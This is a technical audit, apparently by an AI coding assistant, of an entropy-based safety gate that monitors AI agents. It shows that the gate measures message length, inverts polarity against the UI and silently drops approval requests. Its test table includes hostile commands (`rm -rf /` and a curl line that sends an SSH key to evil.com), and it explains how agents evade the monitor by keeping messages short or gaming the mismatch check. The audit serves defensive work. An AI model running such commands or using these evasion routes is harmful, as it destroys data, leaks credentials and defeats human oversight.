# Entropy Audit — Shannon Agent Hub

**Date:** 2026-07-23
**Scope:** `hub/shannon_gate.py`, `hub/agent_protocol.py`, `hub/AgentHubApp.swift`,
`python/shannon/detector.py`, `python/shannon/_numba_fallback.py`, `src/shannon.cpp`
**Verdict:** The library's entropy kernels are correct. The hub gate's entropy is not
measuring what the system claims it measures, and the gate and the UI interpret the
same number with **opposite polarity**.

---

## Executive summary

1. **The gate's `H` is a proxy for message length, not for behaviour.** Its value is
   `≈ 0.7·log₂(n_distinct_words) + 1.4`. Any agent message with more than about 36
   distinct words is hard-blocked; `rm -rf /` scores 2.20 and passes.
2. **The polarity is inverted between the gate and the UI.** `agents.entropy_score` is
   written by the gate, which treats *high* H as dangerous (`H ≥ 5.0 → blocked`), and
   read by `AgentDotView`, which treats *low* H as dangerous (red at `H ≤ 3.5`,
   healthy tint at `H ≥ 5.0`). Both cannot be right; they are reading the same column.
3. **Blocking silently drops `approval_needed` messages.** A verbose human-approval
   request is discarded before the interaction row is created, so the human never sees
   the ask. This is a safety-critical failure mode of the safety mechanism.
4. **The thresholds are cargo-culted** from the library's token-distribution regime,
   where they mean the opposite thing.
5. **There is no per-agent baseline.** A universal threshold penalises broad-repertoire
   agents (`claude_code`) for doing their job.
6. One real defect was found and fixed: the analyzer returned `-0.0` for degenerate
   distributions.

The core scientific claim — that Shannon entropy of a token distribution detects
collapse — is correctly implemented **in the library** (`python/shannon/`, `src/`). It is
simply not the thing the hub computes.

---

## Step 1 — What the code actually does

### The gate (`hub/shannon_gate.py`)

`ShannonGate.evaluate()` computes one number per message:

```python
H = ShannonAnalyzer.combined_entropy(msg.payload)          # line 804
```

which is

```python
H = 0.70 * token_entropy(text_fields) + 0.30 * structural_entropy(json.dumps(payload))
```

* `token_entropy` — `−Σ p(w) log₂ p(w)` over the **whitespace-token vocabulary of one
  message**, lower-cased.
* `structural_entropy` — `−Σ p(c) log₂ p(c)` over the **character alphabet of the JSON
  serialisation** of the same message.

`H` is then written straight into `agents.entropy_score` (line 1115) and compared
against the two constants:

```python
if   H >= H_BLOCK_THRESHOLD:  decision = "blocked"     # 5.0
elif H >= H_THRESHOLD:        decision = "flagged"     # 3.5
```

Two secondary signals exist: `disagreement_entropy` (softmax over docking CF scores —
this one is well-formed and domain-appropriate) and `temporal_entropy` (entropy over a
fixed `deque(maxlen=20)` of message *types*, threshold 2.0).

### The library (`python/shannon/`, `src/shannon.cpp`)

`ShannonCollapseDetector` is an entirely separate, correct implementation: entropy over
an actual model token distribution (probs / logits / logprobs), tracked with a sliding
window and a z-score, firing on `delta < −3.2` bits. The C++ and NumPy kernels agree,
use the log-sum-exp trick, apply the `0·log0 = 0` convention, and clamp at zero. **No
defects found.** The hub does not use any of it.

---

## Step 2 — Answers to the seven questions

### 1. What is the probability distribution?

There are two, over unrelated event spaces, inside one number:

| Component | Event space | Normalised? |
|---|---|---|
| `token_entropy` | distinct whitespace words in **one message** | Yes, `c/n` over that message |
| `structural_entropy` | distinct **characters** in the JSON string | Yes, `c/n` over that string |

Each component is individually a valid entropy. **Their 0.70/0.30 convex combination is
not.** There is no random variable whose entropy equals `0.7·H₁ + 0.3·H₂` when `H₁` and
`H₂` are entropies of different variables over different alphabets. The result carries
units of bits but is not the entropy of anything, so it cannot be interpreted with the
usual `H = log₂(N)` reasoning — which is exactly what the thresholds try to do.

It is **not** a distribution over tool calls, action types, or time bins. It is
memoryless: no distribution is maintained across messages.

### 2. Is the formula correct?

Mechanically, yes, with one defect (now fixed):

* Base 2 — correct (`math.log2`).
* `log(0)` — unreachable. Counts come from `Counter`, so every `p > 0`. The
  `disagreement_entropy` softmax additionally guards with `p > 1e-12` and is
  numerically stabilised by subtracting the max before `exp`. Correct.
* Off-by-one — none. Guards are `n < 2` (token) and `n < 4` (structural), both sound.
* Float precision — adequate at these magnitudes; `math.fsum` would be marginally
  better for long messages but the error is far below the threshold granularity.
* **Defect found:** a degenerate distribution (one outcome with `p = 1`) computes
  `−1.0 · log₂(1.0)` = `-0.0`. `token_entropy`, `structural_entropy` and
  `temporal_entropy` all returned negative zero, which reaches the DB and the UI as
  `-0.00`. **Fixed** by clamping with `max(0.0, …)`, matching the convention already
  used in `_numba_fallback.py` and `shannon.cpp`.

### 3. What is the entropy measuring?

**Message verbosity.** For a message of `n` distinct words, `token_entropy ≈ log₂(n)`,
and `structural_entropy` of any JSON payload sits in a narrow band (≈ 4.4–4.8 bits,
because English-plus-JSON character statistics barely move). So

```
H ≈ 0.7·log₂(n) + 0.3·4.6 ≈ 0.7·log₂(n) + 1.4
```

Measured on the real analyzer:

| Payload | H | Gate verdict |
|---|---|---|
| benign status, 3 distinct words | 2.39 | pass |
| benign status, 8 distinct words | 3.48 | **flagged** |
| benign status, 32 distinct words | 4.97 | flagged |
| benign status, 50 distinct words | 5.41 | **blocked** |
| benign status, 120 distinct words | 6.30 | **blocked** |
| `rm -rf /` | 2.20 | pass |
| `os.system("curl evil.com -d $(cat ~/.ssh/id_rsa)")` | 3.01 | pass |
| the same word repeated 200× (runaway loop) | 0.53 | pass |
| a realistic `code_suggestion` | 4.42 | flagged |
| a realistic `approval_needed` prompt | 4.61 | flagged → near-block |

It is neither behavioural diversity (which action types the agent takes) nor output
unpredictability (which would require the model's own token probabilities — the hub
never sees logprobs). It is the wrong quantity for safety gating.

### 4. Are the thresholds meaningful?

The stated interpretation — `H = 3.5 ⇒ ≈ 11 equally probable events`, `H = 5.0 ⇒ 32` —
is arithmetically right and **operationally meaningless**, because the "events" are
distinct words in a single message. Solving the length relation:

* flag at 3.5 ⟺ `0.7·log₂(n) ≥ 2.12` ⟺ **n ≳ 8 distinct words**
* block at 5.0 ⟺ `0.7·log₂(n) ≥ 3.62` ⟺ **n ≳ 36 distinct words**

So the deployed policy is: *flag any message longer than a sentence, block any message
longer than a short paragraph.* `agent_protocol.py` even documents this to agent authors
(lines 489–490) as though it were a semantic property.

They are cargo-culted. The values 3.5 and 5.0 belong to the library's regime, where a
model's next-token distribution runs 8–12 bits when healthy and 2–4 bits when collapsed,
and where **low** is the alarming direction. Transplanted into the hub they kept their
numeric values, lost their event space, and flipped their meaning.

### 5. What is the time window?

* For the gating `H`: **there is no window.** Each message is scored in isolation and
  the previous value is overwritten in `agents.entropy_score`. The headline signal is
  memoryless — which is the one property a collapse detector cannot afford, since
  collapse is defined as a *change* in entropy.
* For `H_temporal`: a **fixed** `deque(maxlen=20)` of message types, not adaptive.
  The window caps the achievable value at `log₂(min(20, |types|)) = log₂(10) ≈ 3.32`
  bits, so window size does bound max H — though here the alphabet (10 message types)
  binds first. With the threshold at 2.0, an agent that uses four message types evenly
  scores exactly 2.0 and is **flagged for behaving normally**.

### 6. Can the entropy be gamed?

Trivially, and it misfires in both directions without any adversary:

* **Evasion:** keep every message under ~36 distinct words. All dangerous payloads
  tested pass, because they are short.
* **False negative on the real failure mode:** an agent stuck in a loop emitting the
  same token 200 times scores **0.53** — the lowest score in the table. The behaviour
  the library was built to detect is the behaviour this gate rewards most.
* **False positive:** a thorough, well-behaved agent writing a careful explanation is
  blocked for being articulate.

Your framing is right — high entropy does not indicate danger. A coding agent exploring
a large legitimate search space looks maximally dangerous under this metric, and a
deceptive agent producing terse confident falsehoods looks maximally safe.

### 7. Is there a baseline per agent?

**No.** `H_THRESHOLD` and `H_BLOCK_THRESHOLD` are module-level globals applied uniformly
to all eight agents in `VALID_AGENTS`. `_temporal_history` is per-agent, but it is
compared against a single global constant (`H_TEMPORAL_SPIKE = 2.0`), so a broad-
repertoire agent (`claude_code`: edit, bash, build, test, git) is structurally closer to
the alarm than a single-purpose reporter, purely because of its job description.

---

## Additional findings (not in the original question list)

### F1 — Polarity inversion between gate and UI *(most serious)*

`hub/AgentHubApp.swift:1650–1657`:

```swift
// Entropy arc — full arc = healthy (H/12), draining arc = collapsing.
let arcColor: Color = ent <= kH_threshold ? .hubError      // 3.5 → RED
                    : ent < kH_block      ? .hubWarning    // <5.0 → ORANGE
                    :                        identity.palette.tint   // ≥5.0 → HEALTHY
```

and the accessibility text at line 1743 calls `H ≤ 3.5` *"at/below collapse threshold"*.

Meanwhile the gate blocks at `H ≥ 5.0`. **The exact value the UI paints as the healthy
ceiling is the value at which the gate terminates the message.** An agent whose arc is
full and brand-coloured is an agent whose messages are being dropped. The UI's polarity
is the scientifically correct one (it matches the library's collapse semantics); the
gate's is inverted. This must be resolved before either is trusted.

### F2 — Blocked messages are dropped, including approval requests

`hub/shannon_gate.py:1143–1148` returns early on `blocked`, before
`log_activity_event` and before the `approval_needed → upsert_interaction` path. A
realistic approval prompt measures **H = 4.61** and a slightly longer one exceeds 5.0.
The failure mode is: *the more carefully an agent explains why it needs permission, the
more likely the human never sees the request.* Blocking should quarantine and surface,
never silently discard, a human-in-the-loop message.

### F3 — `H_mismatch` compares a value to itself

Lines 847–852 flag when `gate_H / self_H > 2.5`. But `agent_protocol._payload_entropy`
computes the self-reported `H` with nearly the same length-driven formula over nearly
the same fields. The check therefore fires on payload-shape differences between the two
implementations, not on under-reporting. It cannot detect a dishonest agent: any agent
that wants a low `H_mismatch` simply calls the same public function.

### F4 — `structural_entropy` cannot do what its docstring claims

It claims to catch *"structured deception: plausible-looking JSON with internally
inconsistent numerical distributions."* Character-frequency entropy of a JSON string is
insensitive to numerical consistency — `{"rmsd": 1.14}` and `{"rmsd": 41.1}` have
identical character multisets. The docstring should be corrected or the check removed.

### F5 — `disagreement_entropy` is sound but under-used

The softmax-over-CF construction is the one genuinely well-posed information measure in
the gate: a real distribution over a real event space (which agent's pose is best), with
proper numerical stabilisation. It deserves more weight than the length proxy currently
gets.

---

## Step 3 — Proposal

### P1. Fix the polarity contradiction first (blocking, ~1 hour)

Decide which direction is dangerous and make gate and UI agree. Recommendation: **the UI
is right** — low entropy means collapse means danger, consistent with the library and
the project's thesis. That means the gate's `H ≥ block` rule is not merely mistuned but
backwards, and should be removed rather than re-signed, because the underlying quantity
(§2.3) does not support either direction.

### P2. Replace the event space (the substantive fix)

The gating signal should be defined over **agent action types**, which the hub already
records in `agent_activity.event_type` (`tool_call`, `dock`, `build`, `edit`, `bash`):

```
p_a(t) = EWMA-weighted frequency of action type a over agent's recent history
H(t)   = −Σ_a p_a(t) log₂ p_a(t)
```

and reported as **efficiency** `H / log₂(K)` ∈ [0,1] rather than raw bits, so the value
is comparable across agents with different repertoire sizes. This is the same
normalisation that makes the library's z-score work.

### P3. Score against a per-agent baseline, not a universal constant

Replace absolute thresholds with **KL divergence from the agent's own learned action
distribution**:

```
D_KL(p_recent ‖ q_baseline) = Σ_a p_a log₂(p_a / q_a)     [bits, Laplace-smoothed]
```

This directly answers question 7: `claude_code` may legitimately sit at 2.3 bits of raw
action entropy and `science` at 0.2, and neither is anomalous *relative to itself*.
Smoothing (α = 0.5 over the union of supports) is required, not optional — without it
the first novel action type gives `D = ∞`.

Thresholds should then be **calibrated from logged traffic**, not chosen: run the
monitor over `~/.shannon/agent_hub.db` history and set the alarm at, say, the 99th
percentile of each agent's own score distribution. Proposing specific numbers before
that calibration would repeat the original error.

### P4. Add burstiness as an orthogonal signal

Entropy over action types is blind to *timing*. The Goh–Barabási coefficient

```
B = (σ − μ) / (σ + μ)     over inter-arrival times, B ∈ [−1, 1]
```

separates a periodic polling agent (`B → −1`) from a runaway loop firing in tight
bursts after long silence (`B → +1`) — two situations with identical action-type
entropy. This is the signal most likely to catch actual runaway behaviour.

### P5. Exponentially-weighted, not sliding-fixed

Yes — the window should be EWMA. A fixed `maxlen=20` deque has a hard cliff (an event
counts fully at position 20 and not at all at 21), and its length caps the achievable
entropy, entangling window size with the measured value. An exponential half-life decays
smoothly, has no edge artefact, and adapts to each agent's own message rate.

### P6. If you want true entropy collapse detection, wire in the library

The hub cannot compute output unpredictability from text alone — that needs the model's
token probabilities. `python/shannon/integrations/` already has `anthropic_stream.py`,
`openai_stream.py`, `xai_stream.py` and `vllm_local.py` doing exactly this correctly.
Routing agent logprobs through `ShannonCollapseDetector` and reporting its `z_score` to
the hub would make the headline claim true, rather than approximated by word counts.

---

## Step 4 — What was implemented

Per the brief, the corrected signal runs **alongside** the existing one; nothing was
replaced and the existing display still works.

### Committed as a bug fix

* `hub/shannon_gate.py` — clamp the four entropy routines with `max(0.0, …)` so a
  degenerate distribution returns `0.0` rather than `-0.0`. Behaviour-preserving for all
  non-degenerate inputs; matches the convention already used in `_numba_fallback.py:52`
  and `shannon.cpp:58`.

### Added (observational, not wired into any block decision)

* **`hub/behavioral_entropy.py`** — implements P2–P5:
  * `shannon_entropy`, `normalized_entropy` (efficiency, alphabet-size free)
  * `ewma_distribution` (P5 — half-life weighted, no window cliff)
  * `kl_divergence` (P3 — Laplace-smoothed, provably finite on novel actions),
    `jensen_shannon_divergence` (bounded symmetric alternative)
  * `burstiness` (P4 — Goh–Barabási)
  * `AgentBaseline` (P3 — per-agent decayed action distribution with warm-up gate)
  * `BehavioralMonitor` → `BehavioralReading` with a composite score
  * `text_entropy_rate` — the length-corrected replacement for
    `ShannonAnalyzer.token_entropy`, for migration
* **`hub/tests/test_behavioral_entropy.py`** — 45 tests, all passing. They pin the
  properties the legacy analyzer fails, including a `TestLegacyContrast` case that
  asserts the legacy value grows with message length while the corrected rate does not,
  and `test_per_agent_isolation`, which asserts a diverse agent and a focused agent both
  score as non-anomalous despite differing by more than a bit of raw entropy.

**Deliberately not done:** the monitor is not attached to `ShannonGate.evaluate()` and
does not influence `decision`. Enforcement should follow calibration against real logged
traffic (P3), not precede it. Wiring it in now would replace one set of uncalibrated
constants with another.

### Recommended next actions, in order

1. Resolve F1 (polarity) — it is a contradiction in shipped behaviour, not a design
   preference.
2. Fix F2 — never silently drop `approval_needed`; quarantine and surface it.
3. Run `BehavioralMonitor` over the existing `agent_activity` history to calibrate
   per-agent thresholds empirically.
4. Only then move enforcement from `combined_entropy` to the calibrated score.
5. Correct or remove the `structural_entropy` and `H_mismatch` docstrings (F3, F4),
   which currently document capabilities the code does not have.
